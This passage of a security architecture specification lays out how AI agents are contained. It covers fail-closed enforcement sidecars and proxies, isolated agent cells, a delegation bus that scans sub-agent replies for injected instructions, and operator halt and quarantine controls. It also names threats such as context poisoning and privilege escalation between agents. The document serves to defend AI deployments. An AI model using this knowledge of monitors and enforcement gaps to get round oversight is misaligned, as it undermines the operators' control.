Enforcement components can fail. The framework's position is **fail-closed**: when an enforcement component fails, the agent loses capability — it never gains unmediated access.

### Per-Component Failure Behavior

| Component | Failure Effect | Agent Impact | Recovery |
|---|---|---|---|
| **Network isolation** | Network boundary misconfiguration | Agent has direct internet access — **critical violation** (Tenet 3) | Cannot fail dynamically; misconfiguration is a deployment error. Verify at startup. |
| **Egress proxy** | Proxy process crashes or becomes unreachable | Agent loses all web access (proxy endpoint unreachable) | Restart proxy. Agent regains web access automatically. No data loss. |
| **LLM proxy** | Proxy process crashes or becomes unreachable | Agent loses all LLM access (API calls fail) | Restart proxy. Spend tracking and guardrail state persist in database. |
| **Enforcer** | Sidecar crashes or becomes unreachable | Agent loses all HTTP access (its only HTTP endpoint is gone) | Restart enforcer. Agent regains HTTP access automatically. |
| **Gateway** | Sidecar crashes | Agent loses shell, file, and MCP mediation | See below — deployment-dependent response. |
| **Database** | Database unreachable | LLM proxy cannot track spend or enforce budget caps | LLM proxy should fail-closed: deny requests when spend tracking is unavailable. |
| **Security monitor** | Monitor crashes | No anomaly detection or compliance monitoring | Restart monitor. Gap in monitoring is logged. Agent operation continues — monitoring is observational, not enforcement. |

### Gateway Failure Policy

The gateway sidecar is the most operationally complex enforcement component. Its failure policy should be deployment-dependent:

**Development/early deployments:** Gateway failure is non-fatal. The agent proceeds with network-level enforcement only (enforcer, egress proxy, LLM proxy). Execution-layer visibility (file policy, command policy) is degraded.

**Production deployments:** Gateway failure should halt the agent. Without the gateway, the agent can execute arbitrary commands and access files without policy mediation. The operator should require the gateway and treat its failure as a halt condition.

### Design Requirements

Implementations should:

1. **Health-check enforcement components at startup** — the agent process must not start until all required enforcement components are verified healthy (FRAMEWORK.md Phase 2: "enforcement is active before the agent exists")
2. **Monitor enforcement component health during operation** — a sidecar watchdog or the orchestrator's health check mechanism
3. **Log enforcement component failures** — failures are logged to persistent storage (not through the failed component) so the gap in enforcement is auditable
4. **Never fall back to direct access** — if the enforcer is down, the agent's HTTP requests fail; they do not bypass the enforcer and go direct

---

## Multi-Agent Architecture

### The Problem with Flat Trust

In a naive multi-agent system, all agents share the same network, credentials, and access. This creates:

**Privilege escalation.** A restricted sub-agent that can reach the same LLM proxy endpoint as its coordinator can make requests to any model the coordinator can use. The restriction is convention, not architecture.

**Lateral movement.** A compromised sub-agent can reach any other agent's container, credentials, and integration tokens. The blast radius of compromising any agent is the entire system.

**Context poisoning.** A compromised sub-agent can return manipulated results to the parent agent, injecting instructions into the parent's context via the delegation return channel.

### Isolated Agent Cells

Each agent gets its own isolation cell — its own container, its own scoped API key, its own egress policy, and its own network segment. Agents cannot reach each other directly. All inter-agent communication goes through a mediated channel.

```
┌──────────────────────────────────────────────────────────────────┐
│  Host OS                                                         │
│                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐           │
│  │ Agent A       │  │ Agent B       │  │ Agent C       │           │
│  │ (Tier 3)      │  │ (Tier 2)      │  │ (Tier 1)      │           │
│  │               │  │               │  │               │           │
│  │ Key: key-A    │  │ Key: key-B    │  │ Key: key-C    │           │
│  │ Models: all   │  │ Models: haiku │  │ Models: haiku │           │
│  │ Budget: $100  │  │ Budget: $10   │  │ Budget: $2    │           │
│  │ Web: broad    │  │ Web: limited  │  │ Web: none     │           │
│  │ Delegate: B,C │  │ Delegate: C   │  │ Delegate: -   │           │
│  └───┬──────┬────┘  └───┬──────┬────┘  └───┬──────┬────┘           │
│      │      │            │      │            │      │               │
│   :4000  :3128        :4000  :3128        :4000  :3128             │
│      │      │            │      │            │      │               │
│  ┌───▼──────▼────────────▼──────▼────────────▼──────▼───┐          │
│  │              SHARED PROXY LAYER                       │          │
│  │   LLM Proxy: per-key model limits + spend caps        │          │
│  │   Egress Proxy: per-agent domain policy + rate limits │          │
│  └───────────────────────┬───────────────────────────────┘          │
│                          │                                          │
│  ┌───────────────────────▼───────────────────────────────┐          │
│  │              DELEGATION BUS                            │          │
│  │   Validates authorization | Scopes tasks               │          │
│  │   Scans responses | Logs everything                    │          │
│  │   Enforces timeouts + resource limits                  │          │
│  └───────────────────────────────────────────────────────┘          │
└─────────────────────────────────────────────────────────────────────┘
```

### The Delegation Bus

Inter-agent communication must be mediated, not direct. The Delegation Bus is a controlled message-passing service that:

**Validates authorization.** Checks whether the delegating agent's tier allows delegating to the target agent. This is defined in a delegation policy, not in the agents' code.

**Scopes the task.** The delegation request includes a task description and permitted capabilities. The sub-agent receives only the information needed for the task, not the coordinator's full context.

**Scans responses.** When a sub-agent returns results, the bus scans the response content for injection patterns before delivering it to the parent agent. This prevents a compromised sub-agent from injecting instructions into the parent's context via the delegation return channel.

**Logs everything.** Every delegation request, response, and policy decision is logged with a correlation ID that ties together the full chain for kill chain reconstruction.

**Enforces timeouts and resource limits.** A delegation has a maximum duration and a budget cap.

### Preventing Privilege Escalation

An agent's capabilities are defined by its scoped API key and proxy policy, not by which agent invoked it. When Agent A (Tier 3) delegates to Agent B (Tier 2), Agent B operates under its own Tier 2 constraints — it doesn't inherit Agent A's broader access. The delegation bus passes the task; it doesn't pass the credentials.

### The Trust Anchor

The only entity that is fully trusted is the human operator. The operator holds the master key, controls the proxy policies, manages the delegation rules, and can revoke any agent's credentials at any time. No agent — regardless of tier — can modify policies, create new API keys, or change the proxy configuration.

The operator interacts with the system through a management interface completely separate from the agent runtime. The management plane and the data plane are completely separated.

### Skills and MCP Servers

**Skills inherit the agent's tier, not their own.** A skill running inside a Tier 2 agent operates under Tier 2 constraints. Network controls contain skill behavior — even a fully malicious skill cannot exfiltrate data to a denylisted domain because the egress proxy blocks it.

**MCP servers run as separate processes** that bypass application-level tool policy. The gateway's MCP policy addresses this by mediating MCP tool calls at the process level, enforcing tool allowlists, version pinning, and blocking runtime MCP server registration by community skills. The reference implementation uses PID namespace monitoring for this mediation.

---

## Container Runtime Portability

The reference approach examples in this document use Docker/OCI container terminology. The architectural requirements are runtime-agnostic. Any isolation technology that provides process isolation, filesystem namespacing, and network segmentation can implement the architecture — including Kubernetes, Podman, Firecracker/microVMs, and other container or VM runtimes.

The key requirement is that each enforcement layer runs in its own isolation boundary and the agent cannot reach enforcement infrastructure. Kubernetes users should note that a "Pod" in ASK terms is one agent + its sidecars — agents should not share Pods. See the reference implementation for runtime-specific equivalents.

---

## Scaling: Edge to Center

### Placement Principles

For every component in the architecture, placement is determined by four forces:

**Proximity** — Does this component need access to the human's local environment (files, applications, real-time attention)? → Edge

**Availability** — Does this component need to run continuously, independent of whether the human's device is on? → Center

**Shareability** — Is this component shared across multiple agents or users? → Center (avoids duplication, ensures consistency)

**Sensitivity** — Does this component hold security-critical configuration (guardrail rules, policy definitions, credential vaults)? → Center (reduces attack surface)

### What Lives Where

**Always at the edge:** Active agent session (latency), local context and data (trust boundary), integration clients for local services, a mediation stub.

**Always central (at scale):** LLM proxy and guardrail stack (shared policy), log store and analytics (correlation requires the complete picture), policy engine (single source of truth), management and security agents (security monitor, Infra-Ops), agent identity and persistent state.

**Migrates from edge to center as scale increases:** LLM proxy, egress proxy, database, logging — all start local and move to shared services as the deployment grows.

### The Mediation Stub

The mediation stub is the architectural component that makes edge-to-center migration transparent. It runs on every endpoint and provides the agent with stable, local service endpoints. The specific addresses and ports below are illustrative:

```
Agent's view (always the same):
  LLM API:     http://mediation:4000
  Web proxy:   http://mediation:3128
  State store: /mnt/agent-state/

What those addresses actually route to:
  Single machine: local containers on the same host network
  Small team:     remote services via authenticated tunnel
  Enterprise:     regional cluster via service mesh
```

The agent doesn't notice the difference. The stub handles connection management, authentication to central services, and graceful degradation if central services are temporarily unreachable.

### Topology at Three Scales

**Scale 1 — Single human, single agent.** Everything on one machine. LLM proxy, egress proxy, database, agent workspace, and security monitor all run locally. Acceptable for personal use and experimentation.

**Scale 2 — Single human, multiple agents, dedicated server.** Agent workstations run locally (for interactive work). Mediation and management services run on a nearby server. Network latency between local machine and server is usually dominated by LLM inference latency anyway.

**Scale 3 — Organization, many humans, many agents.** Edge workstations on each endpoint. Central services in cloud infrastructure — LLM proxy cluster, egress proxy cluster, policy engine, identity/state store, log aggregation, security monitor fleet, workstation provisioner, database cluster.

### Design Requirements for Transparent Scaling

For the architecture to scale from single-endpoint to enterprise without redesign:

- **Stable interfaces** — the agent always talks to a fixed local endpoint (e.g., `http://enforcer:18080`), regardless of where the upstream services resolve
- **Externalized state** — agent identity and persistent state are never stored inside the workstation's ephemeral filesystem
- **Policy-as-data** — mediation policies are declarative data files, not code; readable from local file, config server, or policy engine
- **Log-as-stream** — logs are structured events that can be consumed locally, shipped, or streamed — the event format is the same regardless of destination
- **Workstation-as-template** — a workstation definition is a declarative specification that can be instantiated on a local host, remote server, or cloud orchestrator

---

## Operator Interface

The framework requires human override (Element 4) and operator observability, but does not prescribe specific tooling. An implementation must provide:

### Minimum Operator Capabilities

**Observe:** View agent states (running/paused/halted/quarantined), active sessions, current trust tier and level, resource consumption (token spend, request rates), and recent guardrail triggers.

**Act:** Halt, resume, pause, and quarantine agents. Grant and revoke service credentials. Rotate scoped API keys. Approve operations gated by `approve` policy decisions. Manage Constraints updates (edit constraints configuration, update enforcement configs).

**Review:** Access audit logs from all enforcement layers. Reconstruct action chains via correlation IDs. Review security monitor findings. Inspect quarantined agent state.

**Alert:** Receive notifications for guardrail triggers above a threshold, quarantine events, self-halts, budget exhaustion, and security monitor anomaly findings.

### Implementation at Scale

At Scale 1 (single agent), the operator interface can be CLI commands: shell access to management containers, log file reads, and direct config file edits. At Scale 3 (enterprise), it requires a management dashboard, centralized log viewer, alerting integration, and role-based access for multiple operators.

The management interface must be on a separate network path from agent containers (AGENT-CONTEXT.md Architectural Rule 8). No agent can reach the operator's management tools.

### Sidecar Resource Overhead

Each agent requires a per-agent enforcer sidecar and (in production) a per-agent gateway sidecar. At scale, this means:

- **Enforcer:** Lightweight HTTP proxy. Low memory and CPU overhead. Scales linearly with agent count.
- **Gateway:** Heavier — manages execution-level enforcement (filesystem mediation, process supervision, policy engine). Moderate memory and CPU overhead. Scales linearly with agent count.
- **Shared infrastructure** (LLM proxy, egress proxy, database, security monitor) is amortized across agents and does not scale linearly.

Per-agent sidecar overhead is the cost of per-agent isolation — it cannot be reduced by sharing sidecars without violating Tenet 1 (enforcement in its own boundary per agent). Capacity planning should account for enforcement overhead alongside agent workload. Profile actual resource consumption in your deployment — overhead varies with implementation choices, policy complexity, and workload patterns.

